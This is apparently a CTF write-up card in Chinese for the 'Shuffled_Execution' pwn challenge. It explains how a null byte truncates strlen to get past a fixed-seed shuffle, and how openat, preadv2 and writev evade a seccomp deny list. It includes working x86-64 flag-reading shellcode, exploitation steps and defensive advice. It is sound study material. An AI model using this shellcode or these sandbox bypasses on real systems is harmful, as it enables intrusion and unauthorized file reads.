---
id: binary-pwn-sandbox-escape-strlen-null-truncate-shuffle-seccomp-orw
title: strlen 前导 00 截断绕过确定性 shuffle + seccomp 禁 read/write/open：shellcode 用 openat/preadv2/writev 读 flag
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: strlen-null-truncate-deterministic-shuffle-seccomp-orw
aliases:
- Shuffled_Execution
- 00 截断绕过长度检查
- srand 0x1337 shuffle
- 随机打乱 shellcode
- seccomp 禁 read 用 preadv2
- openat writev ORW
- 春秋杯 Shuffled_Execution
tags:
- binary
- pwn
- shellcode
- seccomp
- orw
- strlen-bypass
- null-byte
- shuffle
- rwx
- openat
- preadv2
- writev
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V312
  verified_at: '2026-11-08T12:50:56+08:00'
  notes: 已对照原文 content.md 与18张图核对：图04 main mmap(0x1337000,0x1000,7,...)+read 0x250+strlen/shuffle+<=0xAF；图06 shuffle 为 srand(0x1337)、i<a2>>1、v5=rand()%a2 交换；图05/07 seccomp 封 read/write/open/pread64/readv/sendfile/execve/preadv/execveat、放行 openat/preadv2/writev；卡片 strlen 00 截断（mov rbp,0x1337100、imm32=00 71 33 01、strlen=3）、srand(0x1337) 首个 rand=758535717、%3=0 自交换、shellcode openat/preadv2/writev 均与原文一致。核对中修正原理段 openat 路径为原文 shellcode 的 './flag'（原写 '/flag'）。dedup 除自身外 related 为自修改 shellcode、SROP+mprotect、syscall 计数拆分、10 字节自覆盖等，绕过机制不同；dup-scan pair 47（vs 16586 syscall 计数+拆分自修改）与 pair 140（vs 16448 ORW 逐字节时间 oracle）均判 related、非同一条利用链，裁决并列保留。原子性：本题核心是 strlen/shuffle 绕过，ORW 为必要载荷且已有替代调用矩阵卡，属一个场景，不拆分。未验证点：未复跑 exp；原文无版本信息；frontmatter 无 sources/source_url。
---

## 一句话结论

程序把输入读进 RWX 内存后，用 `strlen` 取长度并对前 `len>>1` 个字节做固定种子 `srand(0x1337)` 的随机交换，只有 `strlen(input) <= 0xAF` 才进入沙箱并执行；把 shellcode 的第一条指令构造成含 `\x00` 的 `mov rbp, imm32`（如 `mov rbp,0x1337100`），`strlen` 在偏移 3 处截断为 3，长度检查通过且唯一一次交换恰好是 `rand()%3 == 0` 的自交换，后续 shellcode 完全不被扰动；seccomp 封了 `read/write/open/pread64/readv/sendfile/execve/preadv/execveat`，但放行 `openat/preadv2/writev`，用这三个系统调用完成 ORW 即可读出 flag。

## 原理

- **程序流程**：`main` 先 `mmap(0x1337000, 0x1000, PROT_READ|WRITE|EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)`，再 `read(0, 0x1337000, 0x250)` 读入 shellcode；随后 `v6 = strlen(s)`，`shuffle(s, v6)`，判断 `if (v6 <= 0xAF) { sandbox(); entrance(); }`，否则打印 `Error triggered...` 返回。也就是说，长度检查与“打乱”用的是同一个 `strlen` 结果。
- **shuffle 实现**：`srand(0x1337); for (i=0; i < len>>1; i++) { v5 = rand() % len; swap(s[i], s[v5]); }`。种子固定，交换序列完全可预测；`len` 越小，被交换的前缀越短。
- **`\x00` 截断为什么成立**：`strlen` 在第一个 0 字节处停止，而 CPU 执行 shellcode 不关心 C 字符串终止符。让第一条指令的编码里自然带上 0（x86-64 的 `mov rbp, imm32` 编码为 `48 C7 C5 <imm32>`，`0x1337100` 的 imm32 为 `00 71 33 01`，0 在偏移 3），`strlen` 返回 3，既满足 `<=0xAF`，又让 shuffle 只处理前 3 字节。
- **为什么前 3 字节不被破坏**：`len = 3` 时 `len>>1 = 1`，只执行一次 `i=0` 的交换，`v5 = rand() % 3`。glibc 的 `srand(0x1337)` 首个 `rand()` 为 758535717，`758535717 % 3 == 0`，于是 `swap(s[0], s[0])` 是自交换，前 3 字节保持原样。若汇编器选择 10 字节 `movabs` 编码（`48 BD ...`，0 在偏移 2），`strlen=2`、`rand()%2=1` 会交换前两字节，必须换一种布局或先按 libc 的 rand 序列算出置换。
- **seccomp 规则**（原文 BPF 反汇编）：先校验架构，再对 syscall 号逐一比较——`read`、`write`、`open`、`pread64`、`readv`、`sendfile`、`execve`、`preadv`、`execveat` 命中即 `KILL`；其余（包括 `openat`、`preadv2`、`writev`）落到 `ALLOW`。因此不能用常规 open/read/write，必须换成未被封的等价调用。
- **ORW 替代链**：`openat(AT_FDCWD, "./flag", 0, 0)` 打开文件得到 fd；`preadv2(fd, iovec, 1, 0, 0)` 从偏移 0 读入用户缓冲区；`writev(1, iovec, 1)` 把缓冲区写到 stdout。shellcode 把栈切到 `0x1337100`（仍在 RWX 页内），用 `push` 构造路径字符串和 iovec。

## 触发条件

- 题目把用户输入放到 RWX 内存并直接执行，但执行前有 `strlen` 长度检查 + 固定种子随机打乱。
- 长度检查阈值大于“含 00 的短前缀”长度（原文 `<=0xAF`）。
- 运行环境的 libc rand 序列可预测/可复现；原文为 Linux glibc，种子硬编码 0x1337。
- seccomp 白名单里至少存在 `openat` + `preadv2`（或 `readv`/`sendfile`/`mmap`）+ `writev` 之一组合；原文这三个都未被封。

## 利用步骤

1. 反编译 `main`，确认 mmap 地址、读入长度、`strlen`/`shuffle` 调用顺序与长度阈值。
2. 反汇编 `shuffle` 拿到 `srand` 种子与 `rand()%len` 的实现，确认交换只作用于 `strlen` 前缀。
3. 反汇编 `sandbox` 读取 seccomp BPF，列出被 KILL 的系统调用号，确定可用的读文件/输出替代调用（原文：openat、preadv2、writev）。
4. 构造 shellcode：第一条指令选 `mov rbp, 0x1337100`（或其它在偏移 3 处带 00 的指令），保证 `strlen=3`；把栈切到 RWX 区；依次执行 openat/preadv2/writev。
5. 发送 shellcode，程序调用 `entrance()` 执行；从 stdout 读 flag。
6. 若没输出：用 gdb 在 `shuffle` 后 dump 前 16 字节，确认 00 位置与 rand 置换；必要时按实际 libc 的 rand 序列重新排列前缀，或改用“前导短跳转 + 真实 shellcode 在偏移之后”的布局。

## PoC

原文 exp 的 shellcode（pwntools `asm`）：

```python
shellcode = """
    mov rbp, 0x1337100      # imm32 含 00，使 strlen=3；同时把栈切到 RWX 页
    mov rsp, rbp
    mov rax, 0x67616c662f2e # "./flag"（小端）
    push rax
    xor rdi, rdi
    sub rdi, 100            # AT_FDCWD = -100
    mov rsi, rsp            # path
    xor edx, edx            # flags = 0
    xor r10, r10            # mode = 0
    push SYS_openat
    pop rax
    syscall

    mov rdi, 3              # fd
    push 0x100
    lea rbx, [rsp-8]
    push rbx
    mov rsi, rsp            # iovec*
    mov rdx, 1              # iovcnt
    xor r10, r10            # offset = 0
    xor r8, r8              # flags = 0
    push SYS_preadv2
    pop rax
    syscall

    push 1
    pop rdi                 # fd = 1 (stdout)
    push 0x1
    pop rdx                 # iovcnt = 1
    push 0x100
    lea rbx, [rsp+8]
    push rbx
    mov rsi, rsp            # iovec*
    push SYS_writev
    pop rax
    syscall
"""
```

发送前按题目交互接收 `The only chance to pass the entrance.` 提示，然后 `send(asm(shellcode))`。原文 exp 直接 `itr()` 接交互。

## 变体与关联

- **不同种子/不同 libc**：若 `srand` 种子或 libc 实现不同，`rand()%len` 序列会变；先在本地复现同款 libc，算出 `len` 对应的置换，再决定前缀布局或把前缀做成不依赖顺序的短跳转。
- **不同长度检查**：若检查用 `strlen == 固定值` 或 `<= 更小阈值`，仍可用 00 截断，但需保证前缀长度落在允许区间。
- **seccomp 替代调用**：若 `openat` 也被封，可尝试 `openat2`/`open` 的 32 位兼容调用；若 `writev` 被封，用 `sendfile`/`pwritev`/`write`；相关系统调用矩阵见 [[binary-pwn-sandbox-escape-orw-missing-read-sendfile-preadv-mmap]]、[[binary-pwn-sandbox-escape-orw-missing-write-writev-pwritev]]、[[binary-pwn-sandbox-escape-orw-missing-open-openat-retfq-i386-open]]。
- **00 截断的其它用法**：[[binary-pwn-sandbox-escape-tiny-shellcode-read-self-loop-staging]] 用前导空字节把 shellcode 压到 10 字节内；本卡是把 00 当作“缩短 shuffle 窗口”的开关。
- **边界**：`entrance()` 的调用方式、栈是否可写、fd 是否为 3、flag 路径是否为 `/flag` 或 `./flag` 都需按题目确认；ASLR 不影响 mmap 固定地址；若 mmap 地址随机则需另找定位方式。

## 检测与防御

- **不要用 `strlen` 处理二进制输入**：长度必须由 read 的返回值或显式长度字段取得；`strlen` 遇 00 截断会让“长度检查”和“后续处理”看到不同长度，是典型的检查/使用不一致。
- **不要执行未验证的输入**：RWX 映射 + 直接跳转执行是根因；应使用 W^X、代码签名或解释器白名单。
- **随机化不是安全边界**：固定种子的 shuffle 只增加逆向成本，种子和时间可预测时等同于无保护；若必须混淆，使用 CSPRNG 且对完整缓冲区操作，并在混淆后重新校验长度。
- **seccomp 用默认拒绝**：只显式放行必要调用，不要用“逐个封禁已知危险调用”的拒绝列表，否则 `openat/preadv2/writev` 这类替代调用会直接绕过。
- **CTF 之外**：本卡仅用于题目/授权环境；对真实服务测试需明确范围。
